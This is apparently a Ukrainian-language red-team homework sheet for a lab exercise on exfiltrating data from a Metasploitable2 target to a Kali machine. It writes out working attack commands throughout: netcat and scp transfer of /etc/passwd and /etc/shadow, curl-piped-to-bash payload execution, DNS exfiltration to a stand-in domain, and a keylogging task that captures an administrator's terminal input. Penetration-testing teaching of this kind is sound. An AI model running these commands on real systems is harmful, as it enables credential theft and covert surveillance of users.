
# 🛡️ Lab 7: Домашнє Завдання: Ексфільтрація та Передача Даних (Red Team практикум)

Цей блок домашніх завдань орієнтований на практичне відпрацювання технік ексфільтрації файлів із Metasploitable2 або інших цільових машин у контрольованих середовищах. Кожне завдання **має бути виконане, задокументоване** і містити:

---

## 📦 Завдання 1: Ексфільтрація через Netcat

**Мета:** Передати файл `/etc/passwd` з Metasploitable2 на Kali через Netcat.

🔹 Команди:
- Kali:
  ```bash
  nc -lvnp 9000 > passwd_copy
  ```
- Metasploitable2:
  ```bash
  nc <kali_ip> 9000 < /etc/passwd
  ```

✅ *Надати підтвердження, що файл отримано.*

---

## 🌐 Завдання 2: Передача через `curl | bash`

**Мета:** Завантажити скрипт з Kali і виконати його на Metasploitable2 без збереження.

🔹 Kali:
```bash
python3 -m http.server 80
```

🔹 Metasploitable2:
```bash
curl http://<kali_ip>/payload.sh | bash
```

✅ *Вивід виконання скрипта.*

---

## 🔐 Завдання 3: Використання SCP

**Мета:** Передати файл з Metasploitable2 на Kali або навпаки.

🔹 З таргета:
```bash
scp /etc/shadow kali@<kali_ip>:/tmp/shadow_copy
```

✅ *Підтвердити копіювання. Якщо не вдалося — описати чому (SSH, firewall, auth).*

---

## 🧬 Завдання 4: Base64 передача вручну

**Мета:** Кодувати файл у base64 на Kali, вручну вставити на Metasploitable2, відновити.

🔹 Kali:
```bash
base64 -w0 test.sh
```

🔹 Metasploitable2:
```bash
echo "<base64_string>" > file.b64
base64 -d file.b64 > restored.sh
chmod +x restored.sh
```

✅ *Показати, що файл працює.*

---

## 🧠 Завдання 5: Якщо немає curl/wget — використання Bash TCP `/dev/tcp`

**Мета:** Отримати скрипт без curl/wget через `bash`.

🔹 Bash-функція:
```bash
function __wget() {
    ...
}
```

🔹 Команда:
```bash
__wget http://<kali_ip>/file.sh | bash
```

✅ *Якщо не працює — пояснити.*

---

## 🌐 Завдання 6: Ексфільтрація через DNS (capture-only)

**Мета:** Передати дані з Metasploitable2 у вигляді DNS-запитів і перехопити на Kali.

🔹 Kali:
```bash
tcpdump -i any port 53 -w dnslog.pcap
```

🔹 Metasploitable2:
```bash
# Python-скрипт, що генерує DNS-запити з даними
```

✅ *Витягти дані з pcap через tshark або вручну.*

---

## 🚀 Завдання 7: Передача через `croc`

**Мета:** Встановити `croc`, передати файл `shadow`, отримати на Kali.

🔹 Metasploitable2:
```bash
curl https://getcroc.schollz.com | bash
croc send /etc/shadow
```

🔹 Kali:
```bash
croc <code>
```

✅ *Файл повинен дійти повністю.*

---

## 📤 Завдання 8: Власний upload-сервер + передача через curl з авторизацією

**Мета:** Завантажити файл на сервер з Basic Auth.

🔹 Kali:
```bash
python3 upload_server.py  # Flask сервер з Basic Auth
```

🔹 Metasploitable2:
```bash
curl -u user:pass -F "files=@/etc/hostname" http://<kali_ip>:8000/upload
```

✅ *Файл повинен з’явитись на сервері.*

---

## 🔑 Завдання 9: Реалізувати техніку Keylogger

**Мета:** Отримати команди які вводитиме адміністратор msfadmin або kali

🔹 Отримати PID із терміналу не на пряму, а використовуючи ексфільтрацію даних або інший спосіб, що дозволить отримати PID привілейованого користувача

```bash
ps aux | grep -E 'bash|zsh' | grep -v $$ | grep -v grep | base64 | tr -d '\\n' | fold -w50 | while read x; do host $x.exfil.yourdomain.com; done

```
🔹 Підключитись до цього PID та отримати дані які  вводить привілейований користувач.
🔹 Спробувати різні методи отримання даних, як збереження у файл і отримання через nc так і якісь автоматизовані техніки.

✅ *Отримано команди із терміналу*

---

## 📌 Формат звіту:

Кожне завдання оформити у вигляді:

```
### Завдання X: Назва
✅ Вивід / скріншот
🧠 Як вирішували
❌ Якщо не спрацювало — чому
🔁 Інші варіанти (опціонально)
```

---

Успіхів! 👾
